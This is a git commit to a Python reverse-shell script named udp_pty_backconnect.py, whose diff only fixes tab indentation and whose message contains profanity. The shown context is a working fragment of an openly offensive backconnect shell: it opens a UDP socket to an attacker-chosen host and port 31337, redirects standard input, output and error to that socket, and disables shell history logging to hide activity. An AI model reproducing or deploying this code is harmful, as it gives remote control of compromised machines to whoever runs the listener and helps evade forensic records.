becaef5518f87591a441b08b0abec31ed37b5f64
Darren Martyn <infodox@insecurety.net>
2013-10-19 22:27:31 +0100

    Update udp_pty_backconnect.py
    fuck notepad++ tabs anyway

--- udp_pty_backconnect.py
+++ udp_pty_backconnect.py
@@ -21,8 +21,8 @@ lport = 31337 # XXX: CHANGEME
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	s.connect((lhost, lport))
-	os.dup2(s.fileno(),0)
+    s.connect((lhost, lport))
+    os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
     os.putenv("HISTFILE",'/dev/null')
